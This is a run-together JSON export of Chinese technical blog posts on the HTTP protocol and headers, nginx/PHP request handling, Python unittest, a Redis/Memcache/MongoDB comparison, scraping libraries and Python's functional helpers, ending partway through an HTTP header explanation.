PUT: (webdav) 上传文件（但是浏览器不支持该方法） DELETE：(webdav) 删除 OPTIONS：返回请求的资源所支持的方法的方法 TRACE: 追求一个资源请求中间所经过的代理（该方法不能由浏览器发出） 那什么是URL、URI、URN？ URI Uniform Resource Identifier 统一资源标识符 URL Uniform Resource Locator 统一资源定位符 格式如下： scheme://[username:password@]HOST:port/path/to/source http://www.magedu.com/downloads/nginx-1.5.tar.gz URN Uniform Resource Name 统一资源名称 URL和URN 都属于 URI 为了方便就把URL和URI暂时都通指一个东西 请求的协议有哪些种？有以下几种： http/0.9: statelesshttp/1.0: MIME, keep-alive (保持连接), 缓存http/1.1: 更多的请求方法，更精细的缓存控制，持久连接(persistent connection) 比较常用 下面是Chrome发起的http请求报文头部信息 其中 Accept 就是告诉服务器端，我接受那些MIME类型 Accept-Encoding 这个看起来是接受那些压缩方式的文件 Accept-Lanague 告诉服务器能够发送哪些语言 Connection 告诉服务器支持keep-alive特性 Cookie 每次请求时都会携带上Cookie以方便服务器端识别是否是同一个客户端 Host 用来标识请求服务器上的那个虚拟主机，比如Nginx里面可以定义很多 个虚拟主机 那这里就是用来标识要访问那个虚拟主机。 User-Agent 用户代理，一般情况是浏览器，也有其他类型，如：wget curl 搜索引擎的蜘蛛等 条件请求首部： If-Modified-Since 是浏览器向服务器端询问某个资源文件如果自从什么时间修改过，那么重新发给我，这样就保证服务器端资源文件更新时，浏览器再次去请求，而不是使用缓存中的文件 安全请求首部： Authorization: 客户端提供给服务器的认证信息； 什么是MIME？MIME（Multipurpose Internet Mail Extesions 多用途互联网邮件扩展）是一个互联网标准，它扩展了电子邮件标准，使其能够支持非ASCII字符、二进制格式附件等多种格式的邮件消息，这个标准被定义在RFC 2045、RFC 2046、RFC 2047、RFC 2048、RFC 2049等RFC中。 由RFC 822转变而来的RFC 2822，规定电子邮件标准并不允许在邮件消息中使用7位ASCII字符集以外的字符。正因如此，一些非英语字符消息和二进制文件，图像，声音等非文字消息都不能在电子邮件中传输。MIME规定了用于表示各种各样的数据类型的符号化方法。 此外，在万维网中使用的HTTP协议中也使用了MIME的框架，标准被扩展为互联网媒体类型。 MIME 遵循以下格式：major/minor 主类型/次类型 例如： image/jpg image/gif text/html video/quicktime appliation/x-httpd-php 4.服务器端响应http请求，浏览器得到html代码 看下图 第12号包是http请求包，第32包是http响应包 服务器端WEB程序接收到http请求以后，就开始处理该请求，处理之后就返回给浏览器html文件。 第32号包 是服务器返回给客户端http响应包（200 ok 响应的MIME类型是text/html），代表这一次客户端发起的http请求已成功响应。200 代表是的 响应成功的状态码，还有其他的状态码如下： 1xx: 信息性状态码 100, 101 2xx: 成功状态码 200：OK 3xx: 重定向状态码 301: 永久重定向, Location响应首部的值仍为当前URL，因此为隐藏重定向; 302: 临时重定向，显式重定向, Location响应首部的值为新的URL 304：Not Modified 未修改，比如本地缓存的资源文件和服务器上比较时，发现并没有修改，服务器返回一个304状态码， 告诉浏览器，你不用请求该资源，直接使用本地的资源即可。 4xx: 客户端错误状态码 404: Not Found 请求的URL资源并不存在 5xx: 服务器端错误状态码 500: Internal Server Error 服务器内部错误 502: Bad Gateway 前面代理服务器联系不到后端的服务器时出现 504：Gateway Timeout 这个是代理能联系到后端的服务器，但是后端的服务器在规定的时间内没有给代理服务器响应 用Chrome浏览器看到的响应头信息： Connection 使用keep-alive特性 Content-Encoding 使用gzip方式对资源压缩 Content-type MIME类型为html类型，字符集是 UTF-8 Date 响应的日期 Server 使用的WEB服务器 Transfer-Encoding:chunked 分块传输编码 是http中的一种数据传输机制，允许HTTP由网页服务器发送给客户端应用（通常是网页浏览器）的数据可以分成多个部分，分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供 Vary 这个可以参考（http://blog.csdn.net/tenfyguo/article/details/5939000） X-Pingback 参考（http://blog.sina.com.cn/s/blog_bb80041c0101fmfz.html） 那到底服务器端接收到http请求后是怎么样生成html文件？假设服务器端使用nginx+php(fastcgi)架构提供服务 ① nginx读取配置文件 我们在浏览器的地址栏里面输入的是 http://www.linux178.com （http://可以不用输入，浏览器会自动帮我们添加），其实完整的应该是http://www.linux178.com./ 后面还有个点（这个点代表就是根域，一般情况下我们不用输入，也不显示）,后面的/也是不用添加，浏览器会自动帮我们添加（且看第3部那个图里面的URL），那么实际请求的URL是http://www.linux178.com/，那么好了Nginx在收到 浏览器 GET / 请求时，会读取http请求里面的头部信息，根据Host来匹配 自己的所有的虚拟主机的配置文件的server_name,看看有没有匹配的，有匹配那么就读取该虚拟主机的配置，发现如下配置： root /web/echo 通过这个就知道所有网页文件的就在这个目录下 这个目录就是/ 当我们http://www.linux178.com/时就是访问这个目录下面的文件，例如访问http://www.linux178.com/index.html,那么代表/web/echo下面有个文件叫index.html index index.html index.htm index.php 通过这个就能得知网站的首页文件是那个文件，也就是我们在入http://www.linux178.com/ ，nginx就会自动帮我们把index.html（假设首页是index.php 当然是会尝试的去找到该文件，如果没有找到该文件就依次往下找，如果这3个文件都没有找到，那么就抛出一个404错误）加到后面，那么添加之后的URL是/index.php,然后根据后面的配置进行处理 location ~ .*\\.php(\\/.*)*$ { root /web/echo; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; astcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } 这一段配置指明凡是请求的URL中匹配（这里是启用了正则表达式进行匹配） *.php后缀的（后面跟的参数）都交给后端的fastcgi进程进行处理。 ② 把php文件交给fastcgi进程去处理 于是nginx把/index.php这个URL交给了后端的fastcgi进程处理，等待fastcgi处理完成后（结合数据库查询出数据，填充模板生成html文件）返回给nginx一个index.html文档，Nginx再把这个index.html返回给浏览器，于是乎浏览器就拿到了首页的html代码，同时nginx写一条访问日志到日志文件中去。 注1：nginx是怎么找index.php文件的？当nginx发现需要/web/echo/index.php文件时，就会向内核发起IO系统调用(因为要跟硬件打交道，这里的硬件是指硬盘，通常需要靠内核来操作，而内核提供的这些功能是通过系统调用来实现的)，告诉内核，我需要这个文件,内核从/开始找到web目录，再在web目录下找到echo目录，最后在echo目录下找到index.php文件，于是把这个index.php从硬盘上读取到内核自身的内存空间，然后再把这个文件复制到nginx进程所在的内存空间，于是乎nginx就得到了自己想要的文件了。 注2：寻找文件在文件系统层面是怎么操作的？比如nginx需要得到/web/echo/index.php这个文件 每个分区（像ext3 ext3等文件系统，block块是文件存储的最小单元 默认是4096字节）都是包含元数据区和数据区，每一个文件在元数据区都有元数据条目（一般是128字节大小），每一个条目都有一个编号，我们称之为inode（index node 索引节点），这个inode里面包含 文件类型、权限、连接次数、属主和数组的ID、时间戳、这个文件占据了那些磁盘块也就是块的编号（block，每个文件可以占用多个block,并且block不一定是连续的，每个block是有编号的），如下图所示： 还有一个要点：目录其实也普通是文件，也需要占用磁盘块，目录不是一个容器。你看默认创建的目录就是4096字节，也就说只需要占用一个磁盘块，但这是不确定的。所以要找到目录也是需要到元数据区里面找到对应的条目，只有找到对应的inode就可找到目录所占用的磁盘块。 那到底目录里面存放着什么，难道不是文件或者其他目录吗？ 其实目录存着这么一张表（姑且这么理解），里面放着 目录或者文件的名称和对应的inode号（暂时称之为映射表）,如下图： 假设 / 在数据区占据 1、2号block ，/其实也是一个目录 里面有3个目录 web 111 web 占据 5号block 是目录 里面有2个目录 echo data echo 占据 11号 block 是目录 里面有1个文件 index.php index.php 占据 15 16号 block 是文件 其在文件系统中分布如下图所示 那么内核究竟是怎么找到index.php这个文件的呢？ 内核拿到nginx的IO系统调用要获取/web/echo/index.php这个文件请求之后 ① 内核读取元数据区 / 的inode，从inode里面读取/所对应的数据块的编号，然后在数据区找到其对应的块（1 2号块），读取1号块上的映射表找到web这个名称在元数据区对应的inode号 ② 内核读取web对应的inode（3号），从中得知web在数据区对应的块是5号块，于是到数据区找到5号块，从中读取映射表，知道echo对应的inode是5号，于是到元数据区找到5号inode ③ 内核读取5号inode，得到echo在数据区对应的是11号块，于是到数据区读取11号块得到映射表，得到index.php对应的inode是9号 ④ 内核到元数据区读取9号inode，得到index.php对应的是15和16号数据块，于是就到数据区域找到15 16号块，读取其中的内容，得到index.php的完整内容 浏览器解析html代码，并请求html代码中的资源浏览器拿到index.html文件后，就开始解析其中的html代码，遇到js/css/image等静态资源时，就向服务器端去请求下载（会使用多线程下载，每个浏览器的线程数不一样），这个时候就用上keep-alive特性了，建立一次HTTP连接，可以请求多个资源，下载资源的顺序就是按照代码里的顺序，但是由于每个资源大小不一样，而浏览器又多线程请求请求资源，所以从下图看出，这里显示的顺序并不一定是代码里面的顺序。 浏览器在请求静态资源时（在未过期的情况下），向服务器端发起一个http请求（询问自从上一次修改时间到现在有没有对资源进行修改），如果服务器端返回304状态码（告诉浏览器服务器端没有修改），那么浏览器会直接读取本地的该资源的缓存文件。 详细的浏览器工作原理请看：http://kb.cnblogs.com/page/129756/ 6.浏览器对页面进行渲染呈现给用户 最后，浏览器利用自己内部的工作机制，把请求到的静态资源和html代码进行渲染，渲染之后呈现给用户。 自此一次完整的HTTP事务宣告完成. 本文出自 “雷纳科斯的博客” 博客，请务必保留此出处http://linux5588.blog.51cto.com/65280/1351007","tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://www.duyidong.com/tags/HTTP/"}]},{"title":"单元测试","date":"2016-04-13T12:25:47.000Z","path":"2016/04/13/单元测试/","text":"如果你听说过“测试驱动开发”（TDD：Test-Driven Development），单元测试就不陌生。单元测试是用来对一个模块、一个函数或者一个类来进行正确性检验的测试工作。 比如对函数abs()，我们可以编写出以下几个测试用例： 输入正数，比如1、1.2、0.99，期待返回值与输入相同； 输入负数，比如-1、-1.2、-0.99，期待返回值与输入相反； 输入0，期待返回0； 输入非数值类型，比如None、[]、{}，期待抛出TypeError。 把上面的测试用例放到一个测试模块里，就是一个完整的单元测试。 如果单元测试通过，说明我们测试的这个函数能够正常工作。如果单元测试不通过，要么函数有bug，要么测试条件输入不正确，总之，需要修复使单元测试能够通过。 单元测试通过后有什么意义呢？如果我们对abs()函数代码做了修改，只需要再跑一遍单元测试，如果通过，说明我们的修改不会对abs()函数原有的行为造成影响，如果测试不通过，说明我们的修改与原有行为不一致，要么修改代码，要么修改测试。 这种以测试为驱动的开发模式最大的好处就是确保一个程序模块的行为符合我们设计的测试用例。在将来修改的时候，可以极大程度地保证该模块行为仍然是正确的。我们来编写一个Dict类，这个类的行为和dict一致，但是可以通过属性来访问，用起来就像下面这样： &gt;&gt;&gt; d = Dict(a=1, b=2) &gt;&gt;&gt; d[&#39;a&#39;] 1 &gt;&gt;&gt; d.a 1 mydict.py代码如下： class Dict(dict): def __init__(self, **kw): super().__init__(**kw) def __getattr__(self, key): try: return self[key] except KeyError: raise AttributeError(r&quot;&#39;Dict&#39; object has no attribute &#39;%s&#39;&quot; % key) def __setattr__(self, key, value): self[key] = value 为了编写单元测试，我们需要引入Python自带的unittest模块，编写mydict_test.py如下： import unittest from mydict import Dict class TestDict(unittest.TestCase): def test_init(self): d = Dict(a=1, b=&#39;test&#39;) self.assertEqual(d.a, 1) self.assertEqual(d.b, &#39;test&#39;) self.assertTrue(isinstance(d, dict)) def test_key(self): d = Dict() d[&#39;key&#39;] = &#39;value&#39; self.assertEqual(d.key, &#39;value&#39;) def test_attr(self): d = Dict() d.key = &#39;value&#39; self.assertTrue(&#39;key&#39; in d) self.assertEqual(d[&#39;key&#39;], &#39;value&#39;) def test_keyerror(self): d = Dict() with self.assertRaises(KeyError): value = d[&#39;empty&#39;] def test_attrerror(self): d = Dict() with self.assertRaises(AttributeError): value = d.empty 编写单元测试时，我们需要编写一个测试类，从unittest.TestCase继承。 以test开头的方法就是测试方法，不以test开头的方法不被认为是测试方法，测试的时候不会被执行。 对每一类测试都需要编写一个test_xxx()方法。由于unittest.TestCase提供了很多内置的条件判断，我们只需要调用这些方法就可以断言输出是否是我们所期望的。最常用的断言就是assertEqual()： self.assertEqual(abs(-1), 1) # 断言函数返回的结果与1相等 另一种重要的断言就是期待抛出指定类型的Error，比如通过d[‘empty’]访问不存在的key时，断言会抛出KeyError： with self.assertRaises(KeyError): value = d[&#39;empty&#39;] 而通过d.empty访问不存在的key时，我们期待抛出AttributeError： with self.assertRaises(AttributeError): value = d.empty 运行单元测试 一旦编写好单元测试，我们就可以运行单元测试。最简单的运行方式是在mydict_test.py的最后加上两行代码： if __name__ == &#39;__main__&#39;: unittest.main() 这样就可以把mydict_test.py当做正常的python脚本运行： $ python3 mydict_test.py 另一种方法是在命令行通过参数-m unittest直接运行单元测试： $ python3 -m unittest mydict_test ..... ---------------------------------------------------------------------- Ran 5 tests in 0.000s OK 这是推荐的做法，因为这样可以一次批量运行很多单元测试，并且，有很多工具可以自动来运行这些单元测试。 setUp与tearDown 可以在单元测试中编写两个特殊的setUp()和tearDown()方法。这两个方法会分别在每调用一个测试方法的前后分别被执行。 setUp()和tearDown()方法有什么用呢？设想你的测试需要启动一个数据库，这时，就可以在setUp()方法中连接数据库，在tearDown()方法中关闭数据库，这样，不必在每个测试方法中重复相同的代码： class TestDict(unittest.TestCase): def setUp(self): print(&#39;setUp...&#39;) def tearDown(self): print(&#39;tearDown...&#39;) 可以再次运行测试看看每个测试方法调用前后是否会打印出setUp…和tearDown…。 小结 单元测试可以有效地测试某个程序模块的行为，是未来重构代码的信心保证。 单元测试的测试用例要覆盖常用的输入组合、边界条件和异常。 单元测试代码要非常简单，如果测试代码太复杂，那么测试代码本身就可能有bug。 单元测试通过了并不意味着程序就没有bug了，但是不通过程序肯定有bug。","tags":[{"name":"Python","slug":"Python","permalink":"https://www.duyidong.com/tags/Python/"},{"name":"TDD","slug":"TDD","permalink":"https://www.duyidong.com/tags/TDD/"}]},{"title":"Redis、Memcache、MongoDB性能总结","date":"2016-04-03T13:03:55.000Z","path":"2016/04/03/Redis、Memcache、MongoDB性能总结/","text":"Redis、Memcache、MongoDB有哪些区别？ MemcachedMemcached的优点：Memcached可以利用多核优势，单实例吞吐量极高，可以达到几十万QPS（取决于key、value的字节大小以及服务器硬件性能，日常环境中QPS高峰大约在4-6w左右）。适用于最大程度扛量。 支持直接配置为session handle。坑少。 Memcached的局限性：只支持简单的key/value数据结构，不像Redis可以支持丰富的数据类型。无法进行持久化，数据不能备份，只能用于缓存使用，且重启后数据全部丢失。无法进行数据同步，不能将MC中的数据迁移到其他MC实例中。Memcached内存分配采用Slab Allocation机制管理内存，value大小分布差异较大时会造成内存利用率降低，并引发低利用率时依然出现踢出等问题。需要用户注重value设计。 RedisRedis的优点：支持多种数据结构，如 string（字符串）、 list(双向链表)、dict(hash表)、set(集合）、zset(排序set)、hyperloglog（基数估算）支持持久化操作，可以进行aof及rdb数据持久化到磁盘，从而进行数据备份或数据恢复等操作，较好的防止数据丢失的手段。支持通过Replication进行数据复制，通过master-slave机制，可以实时进行数据的同步复制，支持多级复制和增量复制，master-slave机制是Redis进行HA的重要手段。单线程请求，所有命令串行执行，并发情况下不需要考虑数据一致性问题。支持pub/sub消息订阅机制，可以用来进行消息订阅与通知。支持简单的事务需求，但业界使用场景很少，并不成熟。 Redis的局限性：Redis只能使用单线程，性能受限于CPU性能，故单实例CPU最高才可能达到5-6wQPS每秒（取决于数据结构，数据大小以及服务器硬件性能，日常环境中QPS高峰大约在1-2w左右）。支持简单的事务需求，但业界使用场景很少，并不成熟，既是优点也是缺点。Redis在string类型上会消耗较多内存，可以使用dict（hash表）压缩存储以降低内存耗用。 ：）以下是我个人的补充Mc和Redis都是Key-Value类型，不适合在不同数据集之间建立关系，也不适合进行查询搜索。比如redis的keys pattern这种匹配操作，对redis的性能是灾难。 Mogodbmogodb是一种文档性的数据库。先解释一下文档的数据库，即可以存放xml、json、bson类型系那个的数据。这些数据具备自述性（self-describing），呈现分层的树状数据结构。redis可以用hash存放简单关系型数据。mogodb存放json格式数据。适合场景：事件记录、内容管理或者博客平台，比如评论系统。 原文链接","tags":[{"name":"DataBase","slug":"DataBase","permalink":"https://www.duyidong.com/tags/DataBase/"}]},{"title":"关于爬虫你不得不知道的几个库","date":"2016-04-02T02:21:33.000Z","path":"2016/04/02/关于爬虫你不得不知道的几个库/","text":"关于python爬虫首先解释一下爬虫的原理，就是使用代码模拟浏览器动作通过HTTP协议远程和服务器进行交互，理论上只要是人能操作网站做的事情爬虫都可以做，比如登录，注册，获取信息，但是爬虫有两大壁垒，一个是IP禁止，一个是验证码，前一个基于网站的用户管理，后一个则基于高深莫测的图像识别（机器学习）。除此之外，爬虫的优势是高效。当然对于一些防御力比较低的网站是可以用爬虫进行攻击的，通过大量访问。不过这种攻击方式比较原始，而且没有技术含量。爬虫主要还是被人们用以获取网络上的信息，该信息来自服务器，走的是HTTP协议。 关于HTTP协议我就不多说了，大家可以参考我的另一篇日志HTTP协议详解，下面我来说说实现爬虫的流程。 首先，爬虫要向服务器发送请求，如果请求返回200则可以提取出HTML代码，或json格式对象，或者是XML，就是我们浏览器接收到的代码（如果header配置和浏览器发出的请求header一致，返回的信息是相同的），前两种比较常见。得到服务器返回信息后我们需要进行处理，如果是json的话在python内直接用dict就可以处理了，如果是HTML则需要用到BeautifulSoup等解析工具，这里推荐使用lxml解析器，因为综合性能和易用性来看这是最优解，不要去纠结正则表达式xpath和那个什么pyQuera了，使用BeautifulSoup，支持python2和python3。最后，对于了解过python的朋友，推荐使用gevent协程进行一个并发处理。下面我一个个解释： requests接触python的web应用不可不知的一个库，煞是强大，官方文档供参考： Requests: HTTP for Humans 另外还有个高级用法： 开发者接口 BeautifulSoup同样，没有什么比文档更好的解释： Beautiful Soup 4.2.0 文档 gevent这个我没有看官方文档，我觉得这篇文章讲的就可以： gevent程序员指南 既然说到文档不可不知的一个python文档而我却最近才知道的。。python官方文档： python官方文档 pip文档，分享给大家： pip(可惜没有中文的) 最后是不是该还有个例子等有空再写吧","tags":[{"name":"Python","slug":"Python","permalink":"https://www.duyidong.com/tags/Python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://www.duyidong.com/tags/爬虫/"}]},{"title":"Python函数调用小技巧","date":"2016-04-02T01:54:08.000Z","path":"2016/04/02/Python函数调用小技巧/","text":"python的兴起其中一个不容忽视的因素就是他的简洁和易读，要想写好python代码以下几个方法你不得不知道： filterfilter(function, sequence):对sequence中的item依次执行function(item)，将执行结果为True的item组成一个List/String/Tuple(取决于sequence类型）返回，示例如下： &gt;&gt;&gt; def f(x): return x % 2 != 0 and x % 3 != 0 &gt;&gt;&gt; filter(f, range(2, 25)) [5, 7, 11, 13, 17, 19, 23] &gt;&gt;&gt; def f(x): return x != &#39;a&#39; &gt;&gt;&gt; filter(f, &quot;abcdef&quot;) &#39;bcdef&#39; mapmap(function, sequence):对sequence中的item依次执行function（item），将执行结果组成一个List返回另外map也支持多个sequence，当然这也要求function支持相应数量的参数输入，示例如下： &gt;&gt;&gt; def cube(x): return x*x*x &gt;&gt;&gt; map(cube, range(1, 11)) [1, 8, 27, 64, 125, 216, 343, 512, 729, 1000] &gt;&gt;&gt; def cube(x) : return x + x &gt;&gt;&gt; def add(x, y): return x+y &gt;&gt;&gt; map(add, range(8), range(8)) [0, 2, 4, 6, 8, 10, 12, 14] reducereduce（function，sequence，starting_value):对sequence中的item顺序迭代调用function，如果有starting_value，还可以作为初始值调用，例如可以用来对List求和，示例如下： &gt;&gt;&gt; def add(x,y): return x + y &gt;&gt;&gt; reduce(add, range(1, 11)) （注：1+2+3+4+5+6+7+8+9+10） &gt;&gt;&gt; reduce(add, range(1, 11), 20) （注：1+2+3+4+5+6+7+8+9+10+20） lambda：这是python支持一种有趣的语法，它允许你快速定义单行的最小函数，类似C语言中的宏，可以用在任何需要函数的地方，示例如下： &gt;&gt;&gt; g = lambda x: x * 2 &gt;&gt;&gt; g(3) 6 &gt;&gt;&gt; (lambda x: x * 2)(3) 6 我们也可以把filter map reduce 和lambda结合起来用，函数就可以简单的写成一行。例如 &gt;&gt;&gt;kmpathes = filter(lambda kmpath: kmpath, map(lambda kmpath: string.strip(kmpath), string.split(l, &#39;:&#39;))) 看起来麻烦，其实就像用语言来描述问题一样，非常优雅。对 l 中的所有元素以’:’做分割，得出一个列表。对这个列表的每一个元素做字符串strip，形成一个列表。对这个列表的每一个元素做直接返回操作(这个地方可以加上过滤条件限制)，最终获得一个字符串被’:’分割的列表，列表中的每一个字符串都做了strip，并可以对特殊字符串过滤。 原文链接","tags":[{"name":"Python","slug":"Python","permalink":"https://www.duyidong.com/tags/Python/"}]},{"title":"HTTP协议详解","date":"2016-03-30T13:02:31.000Z","path":"2016/03/30/HTTP协议详解/","text":"这是一篇想写了很久却迟迟没有动笔的题目。从开始接触爬虫，或者说接触web开始，你就是在和http协议打交道了，我想web这个职业只要http协议不过时应该就不会有太大的变化。好，下面是正文: 先说说HTTP协议是怎样工作的：步骤1：浏览器首先向服务器发送HTTP请求，请求包括： 方法：GET还是POST，GET仅请求资源，POST会附带用户数据； 路径：/full/url/path； 域名：由Host头指定：Host: www.sina.com.cn 以及其他相关的Header； 如果是POST，那么请求还包括一个Body，包含用户数据。 步骤2：服务器向浏览器返回HTTP响应，响应包括： 响应代码：200表示成功，3xx表示重定向，4xx表示客户端发送的请求有错误，5xx表示服务器端处理时发生了错误； 响应类型：由Content-Type指定； 以及其他相关的Header； 通常服务器的HTTP响应会携带内容，也就是有一个Body，包含响应的内容，网页的HTML源码就在Body中。 步骤3：如果浏览器还需要继续向服务器请求其他资源，比如图片，就再次发出HTTP请求，重复步骤1、2。 Web采用的HTTP协议采用了非常简单的请求-响应模式，从而大大简化了开发。当我们编写一个页面时，我们只需要在HTTP请求中把HTML发送出去，不需要考虑如何附带图片、视频等，浏览器如果需要请求图片和视频，它会发送另一个HTTP请求，因此，一个HTTP请求只处理一个资源。 HTTP协议同时具备极强的扩展性，虽然浏览器请求的是 http://www.sina.com.cn/ 的首页，但是新浪在HTML中可以链入其他服务器的资源，比如 &lt;img src=&quot;http://i1.sinaimg.cn/home/2013/1008/U8455P30DT20131008135420.png&quot;&gt; ，从而将请求压力分散到各个服务器上，并且，一个站点可以链接到其他站点，无数个站点互相链接起来，就形成了World Wide Web，简称WWW。 超文本传输协议http就是用于规范客户端和服务器之间文本传输的一个协议，我们在访问网站的时候大多数时候都是通过这个协议从服务器上获取想要的数据的。 从get方法和post方法谈起最早让我想要弄清楚HTTP协议是源于我在写爬虫的时候使用python的requests模块，经常会弄不清楚到底该用get方法还是post方法，比较通俗的说法是post方法比较安全，可以带data，get方法就是url请求，请求体全部都暴露在url里面，较不安全，然而研究后发现，HTTP的四种方法get,post,put,delete方法并没有本质上的区别，协议本身并没有强制规范什么情况下必须使用什么请求，事实上这几种请求方法的格式是一样的。 请求方法请求方法（所有方法全为大写）有多种，各个方法的解释如下： GET 请求获取Request-URI所标识的资源 POST 在Request-URI所标识的资源后附加新的数据 HEAD 请求获取由Request-URI所标识的资源的响应消息报头 PUT 请求服务器存储一个资源，并用Request-URI作为其标识 DELETE 请求服务器删除Request-URI所标识的资源 TRACE 请求服务器回送收到的请求信息，主要用于测试或诊断 CONNECT 保留将来使用 OPTIONS 请求查询服务器的性能，或者查询与资源相关的选项和需求 headerGeneral Header（通用头）HTTP里的通用头既可以包含在请求头中也可以包含在响应头中，作用主要是描述HTTO协议本身，下面举例几个常见的通用头： Cache-Control头域Cache-Control指定请求和响应遵循的缓存机制。在请求消息或响应消息中设置Cache-Control并不会修改另一个消息处理过程中的缓存处理过程。请求时的缓存指令包括no-cache、no-store、max-age、max-stale、min-fresh、only-if-cached，响应消息中的指令包括public、private、no-cache、no-store、no-transform、must-revalidate、proxy-revalidate、max-age。各个消息中的指令含义如下： Public指示响应可被任何缓存区缓存。 Private指示对于单个用户的整个或部分响应消息，不能被共享缓存处理。这允许服务器仅仅描述当用户的部分响应消息，此响应消息对于其他用户的请求无效。 no-cache指示请求或响应消息不能缓存 no-store用于防止重要的信息被无意的发布。在请求消息中发送将使得请求和响应消息都不使用缓存。 max-age指示客户机可以接收生存期不大于指定时间（以秒为单位）的响应。 min-fresh指示客户机可以接收响应时间小于当前时间加上指定时间的响应。 max-stale指示客户机可以接收超出超时期间的响应消息。如果指定max-stale消息的值，那么客户机可以接收超出超时期指定值之内的响应消息。 HTTP Keep-AliveKeep-Alive功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。市场上的大部分Web服务器，包括iPlanet、IIS和Apache，都支持HTTP Keep-Alive。对于提供静态内容的网站来说，这个功能通常很有用。但是，对于负担较重的网站来说，这里存在另外一个问题：虽然为客户保留打开的连接有一定的好处，但它同样影响了性能，因为在处理暂停期间，本来可以释放的资源仍旧被占用。当Web服务器和应用服务器在同一台机器上运行时，Keep- Alive功能对资源利用的影响尤其突出。KeepAliveTime 值控制 TCP/IP 尝试验证空闲连接是否完好的频率。如果这段时间内没有活动，则会发送保持活动信号。如果网络工作正常，而且接收方是活动的，它就会响应。如果需要对丢失接收方敏感，换句话说，需要更快地发现丢失了接收方，请考虑减小这个值。如果长期不活动的空闲连接出现次数较多，而丢失接收方的情况出现较少，您可能会要提高该值以减少开销。缺省情况下，如果空闲连接 7200000 毫秒（2 小时）内没有活动，Windows 就发送保持活动的消息。通常，1800000 毫秒是首选值，从而一半的已关闭连接会在 30 分钟内被检测到。 KeepAliveInterval 值定义了如果未从接收方收到保持活动消息的响应，TCP/IP 重复发送保持活动信号的频率。当连续发送保持活动信号、但未收到响应的次数超出 TcpMaxDataRetransmissions 的值时，会放弃该连接。如果期望较长的响应时间，您可能需要提高该值以减少开销。如果需要减少花在验证接收方是否已丢失上的时间，请考虑减小该值或 TcpMaxDataRetransmissions 值。缺省情况下，在未收到响应而重新发送保持活动的消息之前，Windows 会等待 1000 毫秒（1 秒）。 KeepAliveTime 根据你的需要设置就行，比如10分钟，注意要转换成MS。 XXX代表这个间隔值得大小。 Date头域Date头域表示消息发送的时间，时间的描述格式由rfc822定义。例如，Date:Mon,31Dec200104:25:57GMT。Date描述的时间表示世界标准时，换算成本地时间，需要知道用户所在的时区。 Pragma头域Pragma头域用来包含实现特定的指令，最常用的是Pragma:no-cache。在HTTP/1.1协议中，它的含义和Cache-Control:no-cache相同。 Entity header(实体头)请求消息和响应消息都可以包含实体信息，实体信息一般由实体头域和实体组成。实体头域包含关于实体的原信息，实体头包括Allow、Content-Base、Content-Encoding、Content-Language、Content-Length、Content-Location、Content-MD5、Content-Range、Content-Type、Etag、Expires、Last-Modified、extension-header。extension-header允许客户端定义新的实体头，但是这些域可能无法被接受方识别。实体可以是一个经过编码的字节流，它的编码方式由Content-Encoding或Content-Type定义，它的长度由Content-Length或Content-Range定义。 Content-Type实体头Content-Type实体头用于向接收方指示实体的介质类型，指定HEAD方法送到接收方的实体介质类型，或GET方法发送的请求介质类型 Content-Range实体头Content-Range实体头用于指定整个实体中的一部分的插入位置，他也指示了整个实体的长度。在服务器向客户返回一个部分响应，它必须描述响应覆盖的范围和整个实体长度。一般格式：Content-Range:bytes-unitSPfirst-byte-pos-last-byte-pos/entity-legth例如，传送头500个字节次字段的形式：Content-Range:bytes0-499/1234如果一个http消息包含此节（例如，对范围请求的响应或对一系列范围的重叠请求），Content-Range表示传送的范围，Content-Length表示实际传送的字节数。 Last-modified实体头Last-modified实体头指定服务器上保存内容的最后修订时间。例如，传送头500个字节次字段的形式：Content-Range:bytes0-499/1234如果一个http消息包含此节（例如，对范围请求的响应或对一系列范围的重叠请求），Content-Range表示传送的范围，Content-Length表示实际传送的字节数。 HTTP Request Header（请求头）这就是我们最常见的header了，请求报头允许客户端向服务器端传递请求的附加信息以及客户端自身的信息。以下为常见的请求报头： AcceptAccept请求报头域用于指定客户端接受哪些类型的信息。eg：Accept：image/gif，表明客户端希望接受GIF图象格式的资源；Accept：text/html，表明客户端希望接受html文本。 Accept-CharsetAccept-Charset请求报头域用于指定客户端接受的字符集。eg：Accept-Charset:iso-8859-1,gb2312.如果在请求消息中没有设置这个域，缺省是任何字符集都可以接受。 Accept-EncodingAccept-Encoding请求报头域类似于Accept，但是它是用于指定可接受的内容编码。eg：Accept-Encoding:gzip.deflate.如果请求消息中没有设置这个域服务器假定客户端对各种内容编码都可以接受。 Accept-LanguageAccept-Language请求报头域类似于Accept，但是它是用于指定一种自然语言。eg：Accept-Language:zh-cn.如果请求消息中没有设置这个报头域，服务器假定客户端对各种语言都可以接受。 AuthorizationAuthorization请求报头域主要用于证明客户端有权查看某个资源。当浏览器访问一个页面时，如果收到服务器的响应代码为401（未授权），可以发送一个包含Authorization请求报头域的请求，要求服务器对其进行验证。 Host（发送请求时，该报头域是必需的）Host请求报头域主要用于指定被请求资源的Internet主机和端口号，它通常从HTTP URL中提取出来的，eg：我们在浏览器中输入：http://www.guet.edu.cn/index.html浏览器发送的请求消息中，就会包含Host请求报头域，如下：Host：www.guet.edu.cn此处使用缺省端口号80，若指定了端口号，则变成：Host：www.guet.edu.cn:指定端口号 Referer头域Referer头域允许客户端指定请求uri的源资源地址，这可以允许服务器生成回退链表，可用来登陆、优化cache等。他也允许废除的或错误的连接由于维护的目的被追踪。如果请求的uri没有自己的uri地址，Referer不能被发送。如果指定的是部分uri地址，则此地址应该是一个相对地址。 User-Agent我们上网登陆论坛的时候，往往会看到一些欢迎信息，其中列出了你的操作系统的名称和版本，你所使用的浏览器的名称和版本，这往往让很多人感到很神奇，实际上，服务器应用程序就是从User-Agent这个请求报头域中获取到这些信息。User-Agent请求报头域允许客户端将它的操作系统、浏览器和其它属性告诉服务器。不过，这个报头域不是必需的，如果我们自己编写一个浏览器，不使用User-Agent请求报头域，那么服务器端就无法得知我们的信息了。 请求报头举例： GET /form.html HTTP/1.1 (CRLF) Accept:image/gif,image/x-xbitmap,image/jpeg,application/x-shockwave-flash,application/vnd.ms-excel,application/vnd.ms-powerpoint,application/msword,*/* (CRLF) 